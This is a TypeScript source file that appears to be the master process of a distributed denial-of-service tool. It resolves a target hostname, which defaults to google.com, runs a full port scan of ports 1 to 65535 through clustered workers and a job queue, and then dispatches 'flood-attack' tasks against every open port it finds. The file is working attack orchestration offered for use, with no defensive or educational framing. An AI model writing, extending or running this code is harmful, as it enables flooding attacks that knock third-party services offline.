import os = require('os');
import cluster = require('cluster');

// @ts-ignore
import BeeQueue = require('bee-queue');

import { getIpAddressesForHostName } from './dns';
import { IPScanResult } from './worker';

const workers: cluster.Worker[] = [];
let portScanQueue: BeeQueue;
let floodAttackQueue: BeeQueue;

const maxPort = 65535;

export interface IPScanTask {
  ip: string;
  port: number;
}

export interface FloodTask {
  targets: IPScanResult[];
  localPorts: [number, number];
}

export async function startMaster () {
  addSIGINTListener();
  // start timer for complete program runtime
  console.time('complete');

  let hostname = getHostName();

  // Resolve hostname to IP addresses
  console.time('ip-resolve');
  let ipAddresses = await getIpAddressesForHostName(hostname);
  console.timeEnd('ip-resolve');

  // creat the portScanQueue and populate it with tasks for child processes
  // master only creates the tasks and handles the responses
  portScanQueue = new BeeQueue('port-scan', { isWorker: false });
  floodAttackQueue = new BeeQueue('flood-attack', { isWorker: false });
  // make sure they are empty before spawning workers
  await portScanQueue.destroy();
  await floodAttackQueue.destroy();

  spawnWorkers();

  const openPorts: IPScanResult[] = [];
  portScanQueue.on('job succeeded', (jobId: string, result: IPScanResult) => {
    if (result.open) {
      openPorts.push(result);
      console.log(`Job ${jobId} succeeded with result: ${result.ip} - ${result.port} - ${result.open}`);
    }
  });

  console.time('scan-task-creation');
  await createIpScanTasks(portScanQueue, ipAddresses);
  console.timeEnd('scan-task-creation');

  await awaitQueueEmpty(portScanQueue);
  console.log('all ports have been scanned');
  console.log('open ports:', openPorts);

  console.time('attack-task-creation');
  await createFloodTasks(floodAttackQueue, openPorts);
  console.timeEnd('attack-task-creation');
}

// get the hostname from command line argument or default to google.com
function getHostName (): string {
  let hostname;
  // it should be the parameter directly after this filename
  let processArguments = process.argv;

  for (let i = 0; i < processArguments.length; i++) {
    let arg = processArguments[i];
    if (arg.indexOf('ddos.ts') !== -1) {
      hostname = processArguments[i + 1];
      break;
    }
  }

  if (!hostname) {
    return 'google.com';
  }

  if (hostname.indexOf('//') > -1) {
    hostname = hostname.split('/')[2];
  }

  return hostname;
}

function spawnWorkers (): cluster.Worker[] {
  const numCPUs = os.cpus().length;

  // fork workers.
  // consider spawning 1 less to leave a CPU for master
  for (let i = 0; i < numCPUs; i++) {
    workers.push(cluster.fork());
  }

  console.log(`spawned ${workers.length} workers`);
  return workers;
}

async function createIpScanTasks (queue: BeeQueue, ipAddresses: string[]) {
  for (let i = 0; i < ipAddresses.length; i++) {
    // create 65535 tasks in parallel
    let promises = [];
    let ip = ipAddresses[i];

    for (let x = 1; x <= maxPort; x++) {
      // considerable performance gain by switching from 1 ip/port combo per task to instead having ip ranges.
      let task: IPScanTask = { ip: ip, port: x };
      promises.push(queue.createJob(task).save());
    }

    await Promise.all(promises);
    console.log(`created ${promises.length} tasks for ip address ${ip}`);
  }
}

async function createFloodTasks (queue: BeeQueue, openPorts: IPScanResult[]) {
  let promises = [];
  // for this part we create a number of tasks equal to the number of worker processes to make sure work is spread evenly.
  for (let i = 0; i < workers.length; i++) {
    // localPorts assigned to this process
    let startPort = Math.ceil(1 + (maxPort / workers.length) * i);
    let endPort = Math.floor(startPort + maxPort / workers.length);

    if (endPort > maxPort) {
      endPort = maxPort;
    }

    let localPorts: [number, number] = [startPort, endPort];
    let task: FloodTask = {
      targets: openPorts,
      localPorts: localPorts
    };

    promises.push(queue.createJob(task).save());
  }

  await Promise.all(promises);
}

async function awaitQueueEmpty (queue: BeeQueue) {
  return new Promise((resolve) => {
    const resolveIfQueueEmpty = async () => {
      let health = await queue.checkHealth();

      if (health.active === 0) {
        return resolve();
      }

      console.log(`${health.active} tasks remaining in queue`);
      setTimeout(resolveIfQueueEmpty, 100);
    };

    resolveIfQueueEmpty();
  });
}

function addSIGINTListener () {
  process.on('SIGINT', async () => {
    if (floodAttackQueue !== undefined && floodAttackQueue !== null) {
      await floodAttackQueue.close();
    }

    console.log(`SIGINT received on master`);
    if (portScanQueue !== undefined && portScanQueue !== null) {
      await portScanQueue.close();
    }

    process.exit();
  });
}
